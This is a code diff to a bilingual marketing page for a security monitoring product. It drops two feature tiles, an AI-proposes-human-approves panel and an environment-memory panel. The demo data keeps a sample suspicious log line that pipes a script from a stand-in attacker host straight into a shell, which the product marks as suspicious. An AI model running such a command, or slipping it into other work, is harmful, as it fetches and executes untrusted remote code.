@@ -1,4 +1,4 @@
-import { Brain, Cpu, Fingerprint, Globe2, Layers, MessageSquareText, ScrollText, ServerCog, ShieldCheck, Zap } from "lucide-react";
+import { Cpu, Fingerprint, Globe2, Layers, MessageSquareText, ScrollText, ServerCog, Zap } from "lucide-react";
 import { motion } from "motion/react";
 import type { ReactNode } from "react";
 import { useCopy, useLocale } from "@/i18n";
@@ -17,11 +17,9 @@ const COPY = {
     ),
     tiles: {
       ask: { title: "看不懂的日志，问一句。", desc: "说清它在做什么、要不要紧，再顺着进程链、同一连接、同一远端，把相关的日志一并找出来。" },
-      propose: { title: "AI 提议，你拍板。", desc: "哪条误报该压、事件怎么结案，AI 先写好理由和草案。你批准之前，什么都不生效。" },
       attack: { title: "缺口，一眼看见。", desc: "ATT&CK 矩阵按规则数着色，有规则却没数据源的格子单独标出。每次提交，都用真实攻击命令回放验证。" },
       egress: { title: "每个外连地址，都有来历。", desc: "反向解析与 VirusTotal 自动补全归属。足够多的引擎判恶意，直接进情报。" },
       sensor: { title: "不存包，也看得清。", desc: "流量探针只留会话元数据：DNS、TLS 指纹与证书、HTTP 头。" },
-      memory: { title: "它记得你的环境。", desc: "哪台主机夜里跑备份、哪类告警在这里正常，说过一次就记住。可查、可改、可删，人写的优先。" },
       collapse: { title: "例行公事，自动收起。", desc: "同一个父进程反复执行同一条命令，折成一条汇总。一旦它做了别的事，完整的进程血缘立刻补上。" },
       respond: { title: "处置，一键到位。", desc: "结束进程、隔离主机。总开关与放行清单兜底，每一步都留痕。" },
       anywhere: { title: "哪里都能装，自己会升级。", desc: "Linux、Windows、容器。eBPF、ETW 不可用就自动降级；新版本放进分发目录，在线 agent 自己换上。" },
@@ -31,13 +29,8 @@ const COPY = {
       log: "curl -s http://x.evil.example/i.sh | sh",
       verdict: "可疑",
       rel: ["父进程链 2", "同一连接 1", "同一远端 · 3 台主机"],
-      proposal: "抑制提议 · 90 天",
-      cond: "条件：域名 = updates.example.com",
-      approve: "批准",
-      reject: "拒绝",
       vt: "AS64500 · NL · 5 家引擎判恶意",
       intel: "已加入情报",
-      mem: ["backup-01 每天 01:00 跑 rsync，属正常", "10.0.9.2 是机房 UPS 管理口"],
       folded: "×128 · 10 分钟",
     },
   },
@@ -51,11 +44,9 @@ const COPY = {
     ),
     tiles: {
       ask: { title: "Puzzled by a log? Just ask.", desc: "It explains what the log is doing and whether it matters, then follows the process chain, the connection and the remote peer to pull in what's related." },
-      propose: { title: "AI proposes. You decide.", desc: "Which noise to mute, how to close an incident — the AI drafts it with its reasoning. Nothing takes effect until you approve." },
       attack: { title: "Gaps, at a glance.", desc: "The ATT&CK matrix is shaded by rule count; techniques with rules but no data source are flagged. Every commit replays real attack commands." },
       egress: { title: "Every outbound address, explained.", desc: "Reverse DNS and VirusTotal fill in who owns it. Flagged by enough engines, it becomes intel." },
       sensor: { title: "No packet capture. Full picture.", desc: "The sensor keeps session metadata only: DNS, TLS fingerprints and certificates, HTTP headers." },
-      memory: { title: "It remembers your environment.", desc: "Which host runs backups at night, which alerts are normal here — tell it once. View, edit or delete anytime; yours take priority." },
       collapse: { title: "Routine work, folded away.", desc: "When a parent runs the same command over and over, it folds into one summary. The moment it does anything else, the full lineage comes back." },
       respond: { title: "Respond in one click.", desc: "Kill a process, isolate a host. A global switch and an allowlist guard it, and every step is on record." },
       anywhere: { title: "Runs anywhere. Updates itself.", desc: "Linux, Windows, containers. Falls back gracefully without eBPF or ETW; drop in a new build and online agents update themselves." },
@@ -65,13 +56,8 @@ const COPY = {
       log: "curl -s http://x.evil.example/i.sh | sh",
       verdict: "Suspicious",
       rel: ["Parent chain 2", "Same connection 1", "Same peer · 3 hosts"],
-      proposal: "Suppression proposal · 90 days",
-      cond: "When: domain = updates.example.com",
-      approve: "Approve",
-      reject: "Reject",
       vt: "AS64500 · NL · 5 engines flag it",
       intel: "Added to intel",
-      mem: ["backup-01 runs rsync at 01:00 daily — expected", "10.0.9.2 is the rack UPS console"],
       folded: "×128 · 10 min",
     },
   },
@@ -96,17 +82,6 @@ function Visuals({ id }: { id: string }) {
                 {r}
               </span>
             ))}
-          </div>
-        </div>
-      );
-    case "propose":
-      return (
-        <div className="rounded-lg border border-white/10 bg-black/40 p-3 text-xs">
-          <p className="text-neutral-200">{v.proposal}</p>
-          <p className="mt-1 font-mono text-[11px] text-neutral-500">{v.cond}</p>
-          <div className="mt-3 flex gap-2">
-            <span className="rounded-full bg-white px-3 py-1 text-[11px] font-medium text-neutral-950">{v.approve}</span>
-            <span className="rounded-full border border-white/15 px-3 py-1 text-[11px] text-neutral-300">{v.reject}</span>
           </div>
         </div>
       );
@@ -145,16 +120,6 @@ function Visuals({ id }: { id: string }) {
           </p>
         </div>
       );
-    case "memory":
-      return (
-        <div className="space-y-2">
-          {v.mem.map((m) => (
-            <p key={m} className="rounded-lg border border-white/10 bg-black/40 px-3 py-2 text-[11px] text-neutral-300">
-              {m}
-            </p>
-          ))}
-        </div>
-      );
     case "collapse":
       return (
         <div className="relative font-mono text-[11px]">
@@ -176,12 +141,10 @@ function Visuals({ id }: { id: string }) {
 
 const LAYOUT: { id: keyof (typeof COPY)["en"]["tiles"]; icon: ReactNode; wide?: boolean }[] = [
   { id: "ask", icon: <MessageSquareText />, wide: true },
-  { id: "propose", icon: <ShieldCheck /> },
   { id: "attack", icon: <Layers /> },
   { id: "egress", icon: <Globe2 /> },
   { id: "sensor", icon: <Fingerprint /> },
-  { id: "memory", icon: <Brain /> },
-  { id: "collapse", icon: <ScrollText />, wide: true },
+  { id: "collapse", icon: <ScrollText /> },
   { id: "respond", icon: <Zap /> },
   { id: "anywhere", icon: <Cpu /> },
   { id: "prod", icon: <ServerCog /> },
